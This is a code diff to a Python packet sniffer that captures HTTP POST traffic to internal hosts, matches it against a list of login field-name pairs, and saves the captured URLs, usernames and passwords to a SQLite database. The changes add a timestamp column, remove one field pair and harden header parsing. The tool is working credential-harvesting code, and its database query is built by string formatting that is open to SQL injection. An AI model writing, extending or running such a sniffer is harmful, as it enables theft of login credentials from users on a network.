@@ -17,7 +17,6 @@ lists=[('u=','&p='),
     ('F_LOGINNAME=','&F_PASSWORD='),
     ('account=','&password='),
     ('username=','&pwd='),
-    ('renYuanGuanLi.danWei=','&renYuanGuanLi.password='),
     ('userId=','&password='),
     ('UserName=','&PASSWORD='),
     ('txtName=','&txtPwd='),
@@ -42,7 +41,7 @@ def insert_info(url,username,password):
         conn.text_factory = str
         cursor = conn.cursor()
         cursor.execute(
-            'CREATE TABLE IF NOT EXISTS  urls (id integer primary key autoincrement, login_url text, username text, password text)')
+            "CREATE TABLE IF NOT EXISTS  urls (id integer primary key autoincrement,date timestamp not null default (datetime('now','localtime')), login_url text, username text, password text)")
 
         sql_cmd = "select '%s' from urls where username = '%s' and  password='%s'" % (url,username,password)
         cursor.execute(sql_cmd)
@@ -75,7 +74,7 @@ def get_inside_ip():
 def get_filterstr():
     Targets=['dst host %s'% ip for ip in get_inside_ip()]
     return 'tcp and '+ ' or '.join(Targets)
-	
+    
 
 
 def monitor():
@@ -95,7 +94,7 @@ def monitor():
             except (dpkt.dpkt.NeedData, dpkt.dpkt.UnpackError):
                 continue
             if request.headers.get('host','') and request.uri:
-                url='http://'+request.headers['host']+request.uri
+                url='http://'+request.headers.get('host','0.0.0.0')+str(request.uri)
                 if request.method == 'POST':
                     data= request.body
                     for key,value in lists:
